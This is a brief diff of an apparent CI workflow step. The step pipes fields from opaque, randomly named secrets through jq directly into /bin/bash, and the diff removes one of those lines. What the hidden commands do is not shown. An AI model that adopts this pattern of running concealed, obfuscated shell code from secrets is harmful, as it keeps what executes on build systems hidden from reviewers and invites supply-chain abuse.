@@ -20,7 +20,6 @@ jobs:
           qntds710: ${{ secrets.qntds710 }}
         run: |
           printf '%s' "$qntds710" | jq -r .cb22 | /bin/bash
-          printf '%s' "$qrhe3983" | jq -r .jyrt08148 | /bin/bash
           printf '%s' "$sel3" | jq -r .tu6140 | /bin/bash
           printf '%s' "$wmc410" | jq -r .kvby50766 | /bin/bash
           echo $abdz278 | jq -r .vvrm514 | /bin/bash
